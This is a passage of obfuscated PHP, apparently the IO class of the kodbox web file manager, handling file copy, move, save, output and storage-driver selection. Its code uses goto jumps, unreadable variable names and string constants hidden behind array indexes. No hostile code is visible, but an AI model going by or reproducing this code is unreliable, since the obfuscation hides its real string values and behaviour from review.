<?php
 goto A¼Ó‘ˆëÈ‰; A‡µŒ…Å: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($F•–•îîŠ‚, $AÀ ÎïÒ¦ô) { goto FÄÌ½‡‰é; B×ïãàÚ´Ï: Hook::trigger($a¼Úš¹¦èî[1078] . $F•–•îîŠ‚ . $a¼Úš¹¦èî[1081], $FĞ«Ë½œ­, $CÓ²Öò©Š); return $CÓ²Öò©Š; goto cèÉ“×´ÃÆ; FÄÌ½‡‰é: $a¼Úš¹¦èî =& $_SERVER[Ö‘Øù]; $FĞ«Ë½œ­ = $AÀ ÎïÒ¦ô; $GLOBALS[$a¼Úš¹¦èî[1077]] = $a¼Úš¹¦èî[1078] . $F•–•îîŠ‚; goto A²óº—ˆùĞ; A²óº—ˆùĞ: Hook::trigger($a¼Úš¹¦èî[1078] . $F•–•îîŠ‚ . $a¼Úš¹¦èî[1079], $FĞ«Ë½œ­); $Cõ¤Ì¶Ä² = self::driverMake($AÀ ÎïÒ¦ô[0]); if (method_exists($Cõ¤Ì¶Ä², $F•–•îîŠ‚)) { $CÓ²Öò©Š = @call_user_func_array(array($Cõ¤Ì¶Ä², $F•–•îîŠ‚), $AÀ ÎïÒ¦ô); } else { if (method_exists($Cõ¤Ì¶Ä², $a¼Úš¹¦èî[1080])) { $CÓ²Öò©Š = @call_user_func_array(array($Cõ¤Ì¶Ä², $F•–•îîŠ‚), $AÀ ÎïÒ¦ô); } else { if (method_exists(self, $F•–•îîŠ‚)) { $CÓ²Öò©Š = @call_user_func_array(array(self, $F•–•îîŠ‚), $AÀ ÎïÒ¦ô); } else { $CÓ²Öò©Š = call_user_func_array(array(parent, $F•–•îîŠ‚), $AÀ ÎïÒ¦ô); } } } goto B×ïãàÚ´Ï; cèÉ“×´ÃÆ: } public static function init($Aùç‹å•ÚÄ) { return self::driverMake($Aùç‹å•ÚÄ); } public static function copy($DìäÉã†áã, $b÷¢…Š‹¸, $cÊéÖ÷±Ã = false, $fÌÍ°°«Ê„ = false) { return self::copyMoveStart($DìäÉã†áã, $b÷¢…Š‹¸, $cÊéÖ÷±Ã, $_SERVER[Ö‘Øù][544], $fÌÍ°°«Ê„); } public static function move($D“¦æèæ—Ã, $Eìµ¾îäô¥, $c—ññá¥ì± = false, $DùìÌİËß¶ = false) { return self::copyMoveStart($D“¦æèæ—Ã, $Eìµ¾îäô¥, $c—ññá¥ì±, $_SERVER[Ö‘Øù][546], $DùìÌİËß¶); } private static function copyMoveStart($E®ôÍÏÒ‹·, $C¥­ãˆ÷ŠÒ, $aå½ä®õ‹, $C“ŠÉÓÃÇÀ, $a¾æÒˆ˜¹») { $aËÅË±Ëó® =& $_SERVER[Ö‘Øù]; $dö¸Îµ£×Â = array($E®ôÍÏÒ‹·, $C¥­ãˆ÷ŠÒ, $aå½ä®õ‹, $a¾æÒˆ˜¹»); Hook::trigger($aËÅË±Ëó®[1078] . $C“ŠÉÓÃÇÀ . $aËÅË±Ëó®[1079], $dö¸Îµ£×Â); $a³öí›Æë = self::copyMove($E®ôÍÏÒ‹·, $C¥­ãˆ÷ŠÒ, $aå½ä®õ‹, $C“ŠÉÓÃÇÀ, $a¾æÒˆ˜¹»); Hook::trigger($aËÅË±Ëó®[1078] . $C“ŠÉÓÃÇÀ . $aËÅË±Ëó®[1081], $dö¸Îµ£×Â, $a³öí›Æë); return $a³öí›Æë; } public static function saveFile($bì†ÈŠÔğƒ, $eÈäîªï Ì, $E…£ö¢º®î = true) { goto bêŸÀŸá£’; a†¦âÌ™ê›: return $BØŠ²åÙ‹·; goto eÁ¥µ©İÉµ; bêŸÀŸá£’: $FŞ˜ˆ¶‰ =& $_SERVER[Ö‘Øù]; $EëõâˆÆ = self::info($eÈäîªï Ì); $bñ¼„×•œ• = self::driverMake($bì†ÈŠÔğƒ); goto cÀÖÀ‘–˜­; cÀÖÀ‘–˜­: $CùĞŒŠ°ÂË = self::driverMake($eÈäîªï Ì); $d£ãÚ‰Æ–â = !1; if ($CùĞŒŠ°ÂË->pathParse[$FŞ˜ˆ¶‰[1082]]) { $d£ãÚ‰Æ–â = $CùĞŒŠ°ÂË; $CùĞŒŠ°ÂË = self::driverMake($CùĞŒŠ°ÂË->pathParse[$FŞ˜ˆ¶‰[1082]]); } goto eÄïÑš¤Çï; cĞ‡ÑÄÄ: if (!$E…£ö¢º®î && self::driverIsSame($bñ¼„×•œ•, $CùĞŒŠ°ÂË)) { $BïØÂÓÎ†Œ = !1; } $BØŠ²åÙ‹· = self::copyFile($bñ¼„×•œ•, $bì†ÈŠÔğƒ, $CùĞŒŠ°ÂË, $bÌîãĞÒæê, $EëõâˆÆ[$FŞ˜ˆ¶‰[28]], $BïØÂÓÎ†Œ); if ($d£ãÚ‰Æ–â) { $BØŠ²åÙ‹· = $d£ãÚ‰Æ–â->getPathOuter($BØŠ²åÙ‹·); } goto a†¦âÌ™ê›; eÄïÑš¤Çï: if ($bñ¼„×•œ•->pathParse[$FŞ˜ˆ¶‰[1082]]) { $bñ¼„×•œ• = self::driverMake($bñ¼„×•œ•->pathParse[$FŞ˜ˆ¶‰[1082]]); } $bÌîãĞÒæê = $CùĞŒŠ°ÂË->pathFather($eÈäîªï Ì); $BïØÂÓÎ†Œ = !0; goto cĞ‡ÑÄÄ; eÁ¥µ©İÉµ: } private static function copyMove($e¾ù‚è‹–, $a³¦ºìÃ‚, $f°Æ¢‘‚±…, $bŞ«¢º‘†˜, $c¡®¬…›„Ï = false) { goto Dø‡µÜ›®; f˜ƒëÓîÇá: $béÕÏÇó = !1; if ($FË¡ã¶¸Ûß->pathParse[$ešëƒŸ¸õ[1082]]) { $béÕÏÇó = $FË¡ã¶¸Ûß; $FË¡ã¶¸Ûß = self::driverMake($FË¡ã¶¸Ûß->pathParse[$ešëƒŸ¸õ[1082]]); } if ($BğŸµä¶±->pathParse[$ešëƒŸ¸õ[1082]]) { $BğŸµä¶± = self::driverMake($BğŸµä¶±->pathParse[$ešëƒŸ¸õ[1082]]); } goto fÅ‹ã†’¹á; Dø‡µÜ›®: $ešëƒŸ¸õ =& $_SERVER[Ö‘Øù]; if (!$e¾ù‚è‹– || $e¾ù‚è‹– == $ešëƒŸ¸õ[8] || !$a³¦ºìÃ‚) { return !1; } ignore_timeout(); goto bÚåÄğõ”Ó; fÅ‹ã†’¹á: self::check($BğŸµä¶±, $e¾ù‚è‹–, $FË¡ã¶¸Ûß, $a³¦ºìÃ‚); Hook::trigger($ešëƒŸ¸õ[73], $BğŸµä¶±, $e¾ù‚è‹–, $FË¡ã¶¸Ûß, $a³¦ºìÃ‚); $FÚÁ¡™ÙŠ² = self::driverIsSame($BğŸµä¶±, $FË¡ã¶¸Ûß); goto B÷ïá»¡÷²; bÚåÄğõ”Ó: $BğŸµä¶± = self::driverMake($e¾ù‚è‹–); $FË¡ã¶¸Ûß = self::driverMake($a³¦ºìÃ‚); $DŞ–“Ò˜Õõ = $bŞ«¢º‘†˜ == $ešëƒŸ¸õ[546]; goto f˜ƒëÓîÇá; F´Å§øµá–: if ($b·äªŸ¥­Â && $DŞ–“Ò˜Õõ) { $BğŸµä¶±->remove($e¾ù‚è‹–); } if ($béÕÏÇó) { $b·äªŸ¥­Â = $béÕÏÇó->getPathOuter($b·äªŸ¥­Â); } return $b·äªŸ¥­Â; goto AÎò£Æ”õ; B÷ïá»¡÷²: if ($FÚÁ¡™ÙŠ²) { if ($bŞ«¢º‘†˜ == $ešëƒŸ¸õ[546] && !method_exists($FË¡ã¶¸Ûß, $ešëƒŸ¸õ[1083]) && trim($a³¦ºìÃ‚, $ešëƒŸ¸õ[8]) == trim($FË¡ã¶¸Ûß->pathFather($e¾ù‚è‹–), $ešëƒŸ¸õ[8])) { if ($BğŸµä¶±->pathThis($e¾ù‚è‹–) != $c¡®¬…›„Ï && !$BğŸµä¶±->isTypeObject()) { return $BğŸµä¶±->rename($e¾ù‚è‹–, $c¡®¬…›„Ï); } return $FË¡ã¶¸Ûß->getPathOuter($e¾ù‚è‹–); } if (method_exists($FË¡ã¶¸Ûß, $bŞ«¢º‘†˜)) { return $FË¡ã¶¸Ûß->{$bŞ«¢º‘†˜}($e¾ù‚è‹–, $a³¦ºìÃ‚, $f°Æ¢‘‚±…); } } $Bé»Ä¾íš = $BğŸµä¶±->isFile($e¾ù‚è‹–); if (!$Bé»Ä¾íš && $FË¡ã¶¸Ûß->getType() == $ešëƒŸ¸õ[751] && $BğŸµä¶±->getType() == $ešëƒŸ¸õ[106]) { $b·äªŸ¥­Â = $FË¡ã¶¸Ûß->copyFolderFromIO($BğŸµä¶±, $e¾ù‚è‹–, $a³¦ºìÃ‚, $f°Æ¢‘‚±…, $DŞ–“Ò˜Õõ, $c¡®¬…›„Ï); } else { $b·äªŸ¥­Â = self::copyPath($BğŸµä¶±, $e¾ù‚è‹–, $FË¡ã¶¸Ûß, $a³¦ºìÃ‚, $f°Æ¢‘‚±…, $DŞ–“Ò˜Õõ, $Bé»Ä¾íš, $c¡®¬…›„Ï); } goto F´Å§øµá–; AÎò£Æ”õ: } private static function check($a¯ £•‹ñ¯, $e›¤³©·¼¤, $C—ä¨ØËÙá, &$B‡ğ¨æĞ©) { $D¬ß›­ĞÁÕ =& $_SERVER[Ö‘Øù]; if (self::driverIsSame($a¯ £•‹ñ¯, $C—ä¨ØËÙá) && $a¯ £•‹ñ¯->isFolder($e›¤³©·¼¤) && $a¯ £•‹ñ¯->isParentOf($e›¤³©·¼¤, $B‡ğ¨æĞ©)) { show_json(LNG($D¬ß›­ĞÁÕ[1084]), !1); } if (!$a¯ £•‹ñ¯->exist($e›¤³©·¼¤)) { show_json(LNG($D¬ß›­ĞÁÕ[105]), !1); } } private static function copyPath($C‰ë®âÛ›, $bï…ƒ‘Œïé, $EŸª˜·†ñÏ, $f‘°¾ÎÉ„˜, $F‡ƒùšò”, $f£ßŒä£´ , $AÆ›¿Ö¼, $DÉ½î©¿¿è = false) { goto bİ¯¢½í¯á; bİ¯¢½í¯á: $D¹‡¹Ê–³ =& $_SERVER[Ö‘Øù]; $D ÙœÚÍá = empty($DÉ½î©¿¿è) && $DÉ½î©¿¿è !== $D¹‡¹Ê–³[191] ? $C‰ë®âÛ›->pathThis($bï…ƒ‘Œïé) : $DÉ½î©¿¿è; if ($F‡ƒùšò”) { $B±×»…ÇÕÒ = $EŸª˜·†ñÏ->fileNameExist($f‘°¾ÎÉ„˜, $D ÙœÚÍá); $D ÙœÚÍá = $EŸª˜·†ñÏ->fileNameAuto($f‘°¾ÎÉ„˜, $D ÙœÚÍá, $F‡ƒùšò”, !$AÆ›¿Ö¼); $F‡ƒùšò” = $B±×»…ÇÕÒ ? $F‡ƒùšò” : !1; } goto CæĞª…Úí; CæĞª…Úí: if ($AÆ›¿Ö¼) { return self::copyFile($C‰ë®âÛ›, $bï…ƒ‘Œïé, $EŸª˜·†ñÏ, $f‘°¾ÎÉ„˜, $D ÙœÚÍá, $f£ßŒä£´ ); } if ($F‡ƒùšò” == REPEAT_RENAME_FOLDER) { $F‡ƒùšò” = !1; } $Ağ­ÛÂèò = rtrim($f‘°¾ÎÉ„˜, $D¹‡¹Ê–³[8]) . $D¹‡¹Ê–³[8] . $D ÙœÚÍá; goto C˜ÕùÏ»÷å; E’¸×ÚêÖó: $A§Éóïù÷ƒ = is_array($A§Éóïù÷ƒ) ? $A§Éóïù÷ƒ : array($D¹‡¹Ê–³[74] => array(), $D¹‡¹Ê–³[75] => array()); $fÛê—­šÛ‘ = array_merge($A§Éóïù÷ƒ[$D¹‡¹Ê–³[74]], $A§Éóïù÷ƒ[$D¹‡¹Ê–³[75]]); foreach ($fÛê—­šÛ‘ as $f¿Óµ’ÚÄ) { $BÂŠ‹Úë = $f¿Óµ’ÚÄ[$D¹‡¹Ê–³[29]] == $D¹‡¹Ê–³[193]; $bï…ƒ‘Œïé = $C‰ë®âÛ›->getPathInner($f¿Óµ’ÚÄ[$D¹‡¹Ê–³[76]]); $bÌÖÌ†Ò¸Î = self::copyPath($C‰ë®âÛ›, $bï…ƒ‘Œïé, $EŸª˜·†ñÏ, $f‘°¾ÎÉ„˜, $F‡ƒùšò”, $f£ßŒä£´ , $BÂŠ‹Úë); if (!$bÌÖÌ†Ò¸Î) { IO::errorTips($D¹‡¹Ê–³[1085] . $bï…ƒ‘Œïé . $D¹‡¹Ê–³[67] . $f‘°¾ÎÉ„˜); } } goto eîë¢°ãæ½; eîë¢°ãæ½: self::copyMoveKeepInfo($C‰ë®âÛ›, $bï…ƒ‘Œïé, $FËë£ˆæ»); return $FËë£ˆæ»; goto F–Ìñ‡¡‡Ÿ; C˜ÕùÏ»÷å: $FËë£ˆæ» = $EŸª˜·†ñÏ->mkdir($EŸª˜·†ñÏ->getPath($Ağ­ÛÂèò)); $f‘°¾ÎÉ„˜ = $EŸª˜·†ñÏ->getPathInner($FËë£ˆæ»); $A§Éóïù÷ƒ = $C‰ë®âÛ›->listPath($bï…ƒ‘Œïé, !0); goto E’¸×ÚêÖó; F–Ìñ‡¡‡Ÿ: } private static function copyFile($C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $FÛÉóç¼¯Å, $E¥áÎ‘°Ì, $a»µ¨´ºÙµ, $fÚµ¬´»™Š) { goto B˜Ò¥¾¥Œ; B˜Ò¥¾¥Œ: $EÉÃŞËŒï‡ =& $_SERVER[Ö‘Øù]; $E¥áÎ‘°Ì = $FÛÉóç¼¯Å->getPath(rtrim($E¥áÎ‘°Ì, $EÉÃŞËŒï‡[8]) . $EÉÃŞËŒï‡[8] . $a»µ¨´ºÙµ); $bî¬ÍÒĞùÊ = $EÉÃŞËŒï‡[1086] . time() . rand_string(5); goto E¾‘ø±¡Ş•; Eµ¼«ë„¼: mk_dir($eÛŒ¤ˆ); $f”ê˜¡›À‰ = $eÛŒ¤ˆ . $bî¬ÍÒĞùÊ; $dã–…‡ö«” = $f”ê˜¡›À‰; goto CÏ¡áé•ìœ; FÛ‘­½ÄÂ: if ($GLOBALS[$EÉÃŞËŒï‡[6]][$EÉÃŞËŒï‡[88]][$EÉÃŞËŒï‡[795]]) { $A‰ÚƒõÁÑÒ = $GLOBALS[$EÉÃŞËŒï‡[6]][$EÉÃŞËŒï‡[88]][$EÉÃŞËŒï‡[795]]; } $fÚµ¬´»™Š = !0; $eÛŒ¤ˆ = $A‰ÚƒõÁÑÒ; goto Eµ¼«ë„¼; Eò¼›ùëï: self::remove($dã–…‡ö«”); Hook::trigger($EÉÃŞËŒï‡[1088], $C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $FÛÉóç¼¯Å, $E¥áÎ‘°Ì, $a»µ¨´ºÙµ, $E×æ¯íİ“£); self::copyMoveKeepInfo($C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $E×æ¯íİ“£); goto aœŞÆÂñ¬”; E¾‘ø±¡Ş•: Hook::trigger($EÉÃŞËŒï‡[1087], $C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $FÛÉóç¼¯Å, $E¥áÎ‘°Ì, $a»µ¨´ºÙµ, $bî¬ÍÒĞùÊ); if (self::driverIsSame($C‘à—ã¡õŒ, $FÛÉóç¼¯Å)) { if ($fÚµ¬´»™Š) { $E×æ¯íİ“£ = $FÛÉóç¼¯Å->moveFile($A”¤„ÜõÔ‹, $E¥áÎ‘°Ì); } else { $E×æ¯íİ“£ = $FÛÉóç¼¯Å->copyFile($A”¤„ÜõÔ‹, $E¥áÎ‘°Ì); } Hook::trigger($EÉÃŞËŒï‡[1088], $C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $FÛÉóç¼¯Å, $E¥áÎ‘°Ì, $a»µ¨´ºÙµ, $E×æ¯íİ“£); self::copyMoveKeepInfo($C‘à—ã¡õŒ, $A”¤„ÜõÔ‹, $E×æ¯íİ“£); return $E×æ¯íİ“£; } $A‰ÚƒõÁÑÒ = TEMP_FILES; goto FÛ‘­½ÄÂ; aœŞÆÂñ¬”: return $E×æ¯íİ“£; goto c¿ŠÀ³š„Ñ; CÏ¡áé•ìœ: $f”ê˜¡›À‰ = $C‘à—ã¡õŒ->download($A”¤„ÜõÔ‹, $f”ê˜¡›À‰); $f”ê˜¡›À‰ = $C‘à—ã¡õŒ->iconvApp($f”ê˜¡›À‰); $E×æ¯íİ“£ = $FÛÉóç¼¯Å->upload($E¥áÎ‘°Ì, $f”ê˜¡›À‰, $fÚµ¬´»™Š); goto Eò¼›ùëï; c¿ŠÀ³š„Ñ: } private static function copyMoveKeepInfo($bÌç‘Ä½ç…, $E‡¾»Áî‚Î, $C–ò¨ªÎñ) { if (!$C–ò¨ªÎñ) { return; } $d©øÙôÊ = $bÌç‘Ä½ç…->info($E‡¾»Áî‚Î); if (!is_array($d©øÙôÊ)) { return; } IO::setModifyTime($C–ò¨ªÎñ, $d©øÙôÊ[$_SERVER[Ö‘Øù][84]]); } public static function pathFather($fäÀéÛ¼šî) { $D¼¡ÓÜªƒ = IO::init($fäÀéÛ¼šî); $Bˆòõó¯Ğ§ = $D¼¡ÓÜªƒ->pathFather($D¼¡ÓÜªƒ->path); return $D¼¡ÓÜªƒ->getPathOuter($Bˆòõó¯Ğ§); } public static function fileOut($F¢¾ãĞğ, $DÔ”öŒ = false, $cİ¤ƒÔ´ = false, $E•ëÖ¥¡¹ƒ = '') { $BñéËĞÅÄÈ = self::driverMake($F¢¾ãĞğ); if ($BñéËĞÅÄÈ->isFileOutServer()) { return $BñéËĞÅÄÈ->fileOutServer($F¢¾ãĞğ, $DÔ”öŒ, $cİ¤ƒÔ´, $E•ëÖ¥¡¹ƒ); } return $BñéËĞÅÄÈ->fileOut($F¢¾ãĞğ, $DÔ”öŒ, $cİ¤ƒÔ´, $E•ëÖ¥¡¹ƒ); } public static function fileOutImage($DÒ¾ º­Ì, $E„²›îÖ×ƒ = 250) { $CÖµ¶«õóÏ = array(250, 600, 1200, 2000, 3000, 5000); for ($Cøù‚éš = 0; $Cøù‚éš < count($CÖµ¶«õóÏ); $Cøù‚éš++) { if ($Cøù‚éš == 0 && $E„²›îÖ×ƒ <= $CÖµ¶«õóÏ[$Cøù‚éš]) { $E„²›îÖ×ƒ = $CÖµ¶«õóÏ[$Cøù‚éš]; break; } else { if ($E„²›îÖ×ƒ > $CÖµ¶«õóÏ[$Cøù‚éš - 1] && $E„²›îÖ×ƒ <= $CÖµ¶«õóÏ[$Cøù‚éš]) { $E„²›îÖ×ƒ = $CÖµ¶«õóÏ[$Cøù‚éš]; break; } else { if ($Cøù‚éš == count($CÖµ¶«õóÏ) - 1 && $E„²›îÖ×ƒ > $CÖµ¶«õóÏ[$Cøù‚éš]) { $E„²›îÖ×ƒ = $CÖµ¶«õóÏ[$Cøù‚éš]; break; } } } } $Fô‚ƒÇà¿ = self::driverMake($DÒ¾ º­Ì); if ($Fô‚ƒÇà¿->isFileOutServer()) { return $Fô‚ƒÇà¿->fileOutImageServer($DÒ¾ º­Ì, $E„²›îÖ×ƒ); } return $Fô‚ƒÇà¿->fileOutImage($DÒ¾ º­Ì, $E„²›îÖ×ƒ); } private static function driverIsSame($E–•áˆìê, $EëïÛçãì) { goto eİ¤ÔäÚÑ¹; cƒºÚ­‰¢Ö: if ($E–•áˆìê->pathDriver == $EëïÛçãì->pathDriver) { return !0; } return !1; goto CÔ´Ëé¸›Ü; eİ¤ÔäÚÑ¹: $Aó¥“Çî–İ =& $_SERVER[Ö‘Øù]; $b’ë‡³Ø‹ = $E–•áˆìê->getType(); $F¢­§’ùïé = $EëïÛçãì->getType(); goto a‘–·¶…ˆé; a‘–·¶…ˆé: if ($b’ë‡³Ø‹ != $F¢­§’ùïé) { return !1; } if ($b’ë‡³Ø‹ == $Aó¥“Çî–İ[751]) { return !0; } if ($b’ë‡³Ø‹ == $Aó¥“Çî–İ[106]) { return !0; } goto cƒºÚ­‰¢Ö; CÔ´Ëé¸›Ü: } public static function copyUpdate($e‡„®†Âïë, $cØ¯õ†èï¿) { goto E°”›Ğ¸Õ­; fòïÈÉñËç: $Cù¥Ê£Æïˆ = array(); foreach ($bÃèùÂ÷Ëô as $F‡¢Æ÷ˆ¼¾ => $E©‘ßµ—Šö) { if (isset($fó™™›Ğ«[$F‡¢Æ÷ˆ¼¾])) { if ($E©‘ßµ—Šö[$dÉ‘ä¸²”[77]] == 1) { continue; } if ($fó™™›Ğ«[$F‡¢Æ÷ˆ¼¾][$dÉ‘ä¸²”[78]] == $E©‘ßµ—Šö[$dÉ‘ä¸²”[78]]) { continue; } } if ($E©‘ßµ—Šö[$dÉ‘ä¸²”[77]] == 1) { $Cù¥Ê£Æïˆ[] = $cØ¯õ†èï¿ . $dÉ‘ä¸²”[8] . $F‡¢Æ÷ˆ¼¾; continue; } $F•Å¯§ó‘¾ = strstr(trim($F‡¢Æ÷ˆ¼¾, $dÉ‘ä¸²”[8]), $dÉ‘ä¸²”[8]) ? get_path_father($F‡¢Æ÷ˆ¼¾) : $dÉ‘ä¸²”[33]; $BŸ¤ÎÅÏ©“[] = array($dÉ‘ä¸²”[1089] => $E©‘ßµ—Šö[$dÉ‘ä¸²”[76]], $dÉ‘ä¸²”[1090] => rtrim($cØ¯õ†èï¿, $dÉ‘ä¸²”[8]) . $dÉ‘ä¸²”[8] . $F•Å¯§ó‘¾, $dÉ‘ä¸²”[1091] => $E©‘ßµ—Šö); } $A‘êÆÒ¤ê¨ = array($dÉ‘ä¸²”[193] => $BŸ¤ÎÅÏ©“, $dÉ‘ä¸²”[77] => $Cù¥Ê£Æïˆ); goto fÜ»ÒÅÛ¼; fÜ»ÒÅÛ¼: Hook::trigger($dÉ‘ä¸²”[1092], $e‡„®†Âïë, $cØ¯õ†èï¿, $A‘êÆÒ¤ê¨); foreach ($Cù¥Ê£Æïˆ as $E©‘ßµ—Šö) { IO::mkdir($E©‘ßµ—Šö); } foreach ($BŸ¤ÎÅÏ©“ as $E©‘ßµ—Šö) { IO::copy($E©‘ßµ—Šö[$dÉ‘ä¸²”[1089]], $E©‘ßµ—Šö[$dÉ‘ä¸²”[1090]], REPEAT_REPLACE); } goto d¤·ô‰‚‡; f³³ŠŞÚƒ: $bÃèùÂ÷Ëô = self::_listAll($e‡„®†Âïë); $fó™™›Ğ« = self::_listAll($cØ¯õ†èï¿); $BŸ¤ÎÅÏ©“ = array(); goto fòïÈÉñËç; E°”›Ğ¸Õ­: $dÉ‘ä¸²” =& $_SERVER[Ö‘Øù]; if (!IO::exist($e‡„®†Âïë)) { return !1; } if (!IO::exist($cØ¯õ†èï¿)) { IO::mkdir($cØ¯õ†èï¿); } goto f³³ŠŞÚƒ; d¤·ô‰‚‡: } private static function _listAll($câ‹÷ƒ¦®á) { $Dêè­ßÀ‰Í =& $_SERVER[Ö‘Øù]; $câ‹÷ƒ¦®á = KodIO::clear($câ‹÷ƒ¦®á); $fºÕ¿“œ¤ = IO::listAll($câ‹÷ƒ¦®á); foreach ($fºÕ¿“œ¤ as &$c©â«Õàù) { $Díğ¼Ëæ¼Ù = substr($c©â«Õàù[$Dêè­ßÀ‰Í[76]], strlen($câ‹÷ƒ¦®á)); $c©â«Õàù[$Dêè­ßÀ‰Í[1093]] = trim($Díğ¼Ëæ¼Ù, $Dêè­ßÀ‰Í[8]); } unset($c©â«Õàù); return array_to_keyvalue($fºÕ¿“œ¤, $Dêè­ßÀ‰Í[1093]); } public static function fileSubstr($fŒÁÔÕÂ°î, $eÏêÔ±ê×, $CíÄ„¿ = false) { goto e²•—Œàî; e²•—Œàî: $E½©òÛí¸‡ =& $_SERVER[Ö‘Øù]; $f˜ÈÅíÎÚ = self::driverMake($fŒÁÔÕÂ°î); $BäøÅòäá = $f˜ÈÅíÎÚ->size($fŒÁÔÕÂ°î); goto Fêäª‹±Ò; eéø™î†’ö: if ($CíÄ„¿ === !1) { $CíÄ„¿ = $BäøÅòäá - $eÏêÔ±ê×; } if ($eÏêÔ±ê× + $CíÄ„¿ > $BäøÅòäá) { $CíÄ„¿ = $BäøÅòäá - $eÏêÔ±ê×; } if (!$BäøÅòäá && $f˜ÈÅíÎÚ->getType() == $E½©òÛí¸‡[106] && !$f˜ÈÅíÎÚ->exist($fŒÁÔÕÂ°î)) { throw new Exception($E½©òÛí¸‡[1094] . LNG($E½©òÛí¸‡[1095]) . $E½©òÛí¸‡[960] . get_path_this($fŒÁÔÕÂ°î) . $E½©òÛí¸‡[33]); } goto C‹ùì¦‚ÂŒ; dî´ÓçãßË: if (!$Dğ…à¨Êë× && $CíÄ„¿ && isset($GLOBALS[$E½©òÛí¸‡[1096]])) { throw new Exception($GLOBALS[$E½©òÛí¸‡[1096]][$E½©òÛí¸‡[1097]]); } return $Dğ…à¨Êë×; goto cŠƒƒ§¯èÎ; C‹ùì¦‚ÂŒ: if ($CíÄ„¿ <= 0) { return $E½©òÛí¸‡[33]; } if ($eÏêÔ±ê× < 0 || $eÏêÔ±ê× >= $BäøÅòäá || $CíÄ„¿ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\x65\122\x65\x61\144\x20\145\x72\162\x6f\162\41\x20\163\164\x61\162\x74\75{$eÏêÔ±ê×}\x3b\x6c\x65\156\147\x74\x68\x3d{$CíÄ„¿}\73\x20\x73\151\x7a\145\75{$BäøÅòäá}\x3b"); } $Dğ…à¨Êë× = $f˜ÈÅíÎÚ->fileSubstr($fŒÁÔÕÂ°î, $eÏêÔ±ê×, $CíÄ„¿); goto dî´ÓçãßË; Fêäª‹±Ò: $b…¬Ğ¾èÎ = $eÏêÔ±ê×; $CÆÍ¼äƒŞÊ = $CíÄ„¿; if ($eÏêÔ±ê× < 0) { $eÏêÔ±ê× = $BäøÅòäá + $eÏêÔ±ê×; } goto eéø™î†’ö; cŠƒƒ§¯èÎ: } private static function driverMake(&$c·‚ÔÁğ¼ò) { goto a÷Äò’´”Ï; dŸÇğ£³íø: if ($aã§ñ½¯„˜[$EÁİŸŸ ×[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aã§ñ½¯„˜[$EÁİŸŸ ×[395]]]) { return !1; } $c·‚ÔÁğ¼ò = $aã§ñ½¯„˜[$EÁİŸŸ ×[1098]]; $c£Êª…„Ûè = self::driverGet($aã§ñ½¯„˜, $c·‚ÔÁğ¼ò); goto e—ñµå‚‚Ğ; e—ñµå‚‚Ğ: return $c£Êª…„Ûè; goto d¯ ïò§Â¿; a÷Äò’´”Ï: $EÁİŸŸ × =& $_SERVER[Ö‘Øù]; $aã§ñ½¯„˜ = KodIO::parse($c·‚ÔÁğ¼ò); if (!self::$driverListSystem) { $C¿•á³‚ = Model($EÁİŸŸ ×[760])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($C¿•á³‚, $EÁİŸŸ ×[395]); } goto dŸÇğ£³íø; d¯ ïò§Â¿: } private static function driverGet($Cê½ùêÏê, &$Có÷¸¤ãšã) { goto AĞÚİ™İÖµ; fÍóÕ‹¨È®: if (isset($B¶ÄœÉÉ[$a—ğñ¯‘©‰[6]][$a—ğñ¯‘©‰[1110]])) { $ešË…Ÿ³ìó->pathBase = rtrim($B¶ÄœÉÉ[$a—ğñ¯‘©‰[6]][$a—ğñ¯‘©‰[1110]], $a—ğñ¯‘©‰[8]) . $a—ğñ¯‘©‰[8]; $Có÷¸¤ãšã = $ešË…Ÿ³ìó->pathBase . ltrim($Có÷¸¤ãšã, $a—ğñ¯‘©‰[8]); } $Có÷¸¤ãšã = $ešË…Ÿ³ìó->getPath($Có÷¸¤ãšã); if (isset($Cê½ùêÏê[$a—ğñ¯‘©‰[1082]])) { $Có÷¸¤ãšã = $Cê½ùêÏê[$a—ğñ¯‘©‰[1082]]; } goto D“ÒÒÑ©¾«; fÜŸ£Á•§§: switch ($Cê½ùêÏê[$a—ğñ¯‘©‰[29]]) { case KodIO::KOD_IO: $B¶ÄœÉÉ = self::$driverListSystem[$fšä¦ˆĞÛ]; break; case KodIO::KOD_SOURCE: $Có÷¸¤ãšã = $fšä¦ˆĞÛ . $Có÷¸¤ãšã; $B¶ÄœÉÉ = array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1101], $a—ğñ¯‘©‰[6] => $Cê½ùêÏê); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $BİöŠÎÎµ¹ = $GLOBALS[$a—ğñ¯‘©‰[1102]]; self::$driverListUser = array_to_keyvalue($BİöŠÎÎµ¹, $a—ğñ¯‘©‰[395]); } $B¶ÄœÉÉ = self::$driverListUser[$fšä¦ˆĞÛ]; break; case KodIO::KOD_SHARE_LINK: $B¶ÄœÉÉ = array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1103], $a—ğñ¯‘©‰[6] => $Cê½ùêÏê); $e‡ëñš‘ñ° = Action($a—ğñ¯‘©‰[1104])->sharePathInfo($Cê½ùêÏê[$a—ğñ¯‘©‰[76]]); $Có÷¸¤ãšã = $e‡ëñš‘ñ°[$a—ğñ¯‘©‰[397]]; if (!$e‡ëñš‘ñ°[$a—ğñ¯‘©‰[397]]) { $D±§¹Æõ¸È = Model($a—ğñ¯‘©‰[590])->getInfo($e‡ëñš‘ñ°[$a—ğñ¯‘©‰[483]]); $Có÷¸¤ãšã = KodIO::clear($D±§¹Æõ¸È[$a—ğñ¯‘©‰[1105]] . $Cê½ùêÏê[$a—ğñ¯‘©‰[1098]]); $Cê½ùêÏê[$a—ğñ¯‘©‰[481]] = $D±§¹Æõ¸È; $Cê½ùêÏê[$a—ğñ¯‘©‰[1082]] = $Có÷¸¤ãšã; $B¶ÄœÉÉ = array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1106], $a—ğñ¯‘©‰[6] => $Cê½ùêÏê); } break; case KodIO::KOD_SHARE_ITEM: $B¶ÄœÉÉ = 